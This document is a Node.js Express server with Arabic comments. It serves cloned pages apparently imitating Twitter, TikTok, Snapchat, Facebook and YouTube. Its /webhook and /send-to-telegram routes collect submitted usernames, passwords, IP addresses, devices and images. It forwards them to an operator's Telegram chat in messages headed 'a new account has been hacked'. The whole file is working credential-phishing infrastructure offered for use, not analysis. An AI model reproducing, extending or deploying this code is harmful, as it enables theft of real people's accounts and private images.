require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// تكوين multer للتعامل مع رفع الملفات
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// الحصول على التوكن من متغير البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// التحقق من وجود التوكن
if (!BOT_TOKEN) {
  console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
}

// 🔥 أهم تعديل: إضافة مصفوفة المواقع المتاحة
const availableSites = [
  'twitter.html',
  'Bobji.html',
  'tik.html',
  'snap.html',
  'face.html',
  'yot.html',
  'des.html'  // ← أضف موقع des.html هنا
];

// Middleware للتعامل مع معرفات Telegram
app.use((req, res, next) => {
  const pathParts = req.path.split('/').filter(part => part !== '');
  
  if (pathParts.length >= 2) {
    const siteName = pathParts[0];
    const telegramId = pathParts[1];
    
    const siteFile = `${siteName}.html`;
    if (availableSites.includes(siteFile)) {
      req.siteName = siteName;
      req.telegramId = telegramId;
      req.url = `/${siteFile}`;
    }
  }
  
  next();
});

// وظيفة لإرسال رسالة إلى Telegram
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null, isImage = false) {
  try {
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
      if (fileBuffer) {
        console.log(`📁 [محاكاة] مع ملف: ${filename} (صورة: ${isImage})`);
      }
      return true;
    }

    if (fileBuffer && filename) {
      const formData = new FormData();
      
      if (isImage) {
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        
        const mimeType = getMimeType(filename);
        formData.append('photo', fileBuffer, { 
          filename: filename,
          contentType: mimeType 
        });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      } else {
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('document', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      }
    } else {
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// وظيفة مساعدة لتحديد نوع MIME
function getMimeType(filename) {
  const ext = path.extname(filename).toLowerCase();
  const mimeTypes = {
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.png': 'image/png',
    '.gif': 'image/gif',
    '.bmp': 'image/bmp',
    '.webp': 'image/webp'
  };
  return mimeTypes[ext] || 'image/jpeg';
}

// ========== Routes للمواقع ==========

// Route للمواقع بدون معرف Telegram
app.get('/:siteName', (req, res) => {
  const siteName = req.params.siteName;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head><title>404 - Not Found</title></head>
      <body>
        <h1>404 - الموقع غير موجود</h1>
        <p>الموقع "${siteName}" غير موجود في القائمة.</p>
        <p>المواقع المتاحة: ${availableSites.map(s => s.replace('.html', '')).join(', ')}</p>
      </body>
      </html>
    `);
  }
});

// Route للمواقع مع معرف Telegram
app.get('/:siteName/:telegramId', (req, res) => {
  const siteName = req.params.siteName;
  const telegramId = req.params.telegramId;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    console.log(`🌐 طلب موقع ${siteName} مع معرف Telegram: ${telegramId}`);
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head><title>404 - Not Found</title></head>
      <body>
        <h1>404 - الموقع غير موجود</h1>
        <p>الموقع "${siteName}" غير موجود.</p>
      </body>
      </html>
    `);
  }
});

// ========== Routes لـ Telegram Bot ==========

// نقطة النهاية الرئيسية لاستقبال البيانات من المواقع
app.post('/webhook', upload.any(), async (req, res) => {
  try {
    const { 
      type,
      data,
      chatId,
      platform,
      additionalInfo
    } = req.body;

    if (!type || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'Type and chatId are required' 
      });
    }

    let message = '';
    let fileBuffer = null;
    let filename = null;
    let isImage = false;

    switch (type) {
      case 'login':
        const { username, password, amount, device } = typeof data === 'string' ? JSON.parse(data) : data;
        const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'غير معروف';
        
        message = `♦️ - تم اختراق حساب جديد 
🔹 - اسم المستخدم: ${username}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount || 'غير محدد'}
📱 - الجهاز: ${device || 'غير معروف'}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform || 'غير محدد'}`;
        break;

      case 'register':
        const { user, pass, ip } = typeof data === 'string' ? JSON.parse(data) : data;
        message = `📝 تسجيل حساب جديد
👤 اسم المستخدم: ${user}
🔐 كلمة المرور: ${pass}
🌐 عنوان IP: ${ip || 'غير معروف'}
🔄 المنصة: ${platform || 'غير محدد'}`;
        break;

      case 'image':
        if (req.files && req.files.length > 0) {
          fileBuffer = req.files[0].buffer;
          filename = `image-${Date.now()}.jpg`;
          isImage = true;
        }
        message = `🖼️ تم اختراق صورة جديدة\n👤 المستخدم: ${data.username || 'غير معروف'}`;
        if (data.imageType) message += `\n📸 نوع الصورة: ${data.imageType}`;
        break;

      default:
        message = `📨 بيانات جديدة\n${JSON.stringify(data, null, 2)}`;
        break;
    }

    if (additionalInfo) {
      message += `\n📋 معلومات إضافية: ${additionalInfo}`;
    }

    const success = await sendToTelegram(chatId, message, fileBuffer, filename, isImage);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح'
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال البيانات إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing webhook:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// Routes القديمة
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
    
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'غير معروف';
    
    const message = `♦️ - تم اختراق حساب جديد 
🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}`;

    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.json({ success: true, message: 'تم الإرسال بنجاح' });
    } else {
      res.status(500).json({ success: false, message: 'فشل في الإرسال' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// نقطة النهاية للتحقق من عمل السيرفر
app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'Server is running',
    tokenConfigured: !!BOT_TOKEN,
    availableSites: availableSites
  });
});

// Route رئيسي بسيط
app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true,
    message: 'مرحباً بك في سيرفر Telegram Bot',
    availableSites: availableSites.map(s => s.replace('.html', ''))
  });
});

// بدء السيرفر
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  console.log(`📁 المواقع المتاحة: ${availableSites.join(', ')}`);
  if (!BOT_TOKEN) {
    console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
  }
});
